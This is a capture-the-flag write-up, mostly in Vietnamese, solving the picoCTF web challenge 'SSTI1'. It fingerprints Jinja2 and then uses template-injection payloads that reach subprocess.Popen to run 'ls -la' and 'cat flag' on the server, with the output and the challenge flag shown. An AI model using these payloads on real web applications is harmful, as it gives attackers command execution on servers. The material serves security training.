# SSTI1

Web, 100 points

## Description:

> I made a cool website where you can announce whatever you want! Try it out!

> Additional details will be available after launching your challenge instance.

## Hint:

> 1.  Server Side Template Injection

## Solution:

Nhìn vào đề bài và hint ta cũng xác định được trang web bị 1 lỗi khá nghiêm trọng đó là SSTI (Server Side Template Injection). Để xác định loại SSTI nào thì ta có thể tiêm 1 số câu lệnh

![](../images/template-decision-tree.png)

Ví dụ, payload {{7*'7'}} trả về 49 trong Twig và 7777777 trong Jinja2

Thì trang web này với payload ` {{7*'7'}}` trả về 7777777 nên ta có thể xác định đây là kiểu JinJa2 1 loại khá phố biến

Mục tiêu của mình là xác định tệp chứa flag để có thể đọc được

```
{{ self.__class__.__mro__[1].__subclasses__()}}
```

Payload này dùng để liệt kê tất cả các class con của lớp cha đầu tiên của `self.__class__` thường là **object** trong python

Mục tiêu tiếp theo là tìm class `subprocess.Popen` để có thể chạy được lệnh các lệnh hệ thống như liệt kê các file...

Dùng notepad++ :))) biết được class `subprocess.Popen` ở vị trí 356

```
{{ self.__class__.__mro__[1].__subclasses__()[356]('ls -la', shell=True, stdout=-1).stdout.read()}}
```

Giờ thì dễ rồi ta sử dụng payload này để liệt kê tất cả các file trong hệ thống và thấy được có file tên flag

```
b'total 12\ndrwxr-xr-x 1 root root 25 Mar 24 15:02 .\ndrwxr-xr-x 1 root root 23 Mar 24 15:02 ..\ndrwxr-xr-x 2 root root 32 Mar 24 15:02 __pycache__\n-rwxr-xr-x 1 root root 1241 Mar 6 03:27 app.py\n-rw-r--r-- 1 root root 58 Mar 6 19:44 flag\n-rwxr-xr-x 1 root root 268 Mar 6 03:27 requirements.txt\n'
```

```
{{ self.__class__.__mro__[1].__subclasses__()[356]('cat flag', shell=True, stdout=-1).stdout.read()}}
```

Giờ thì lụm flag thoii

```
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_eb0c6390}
```
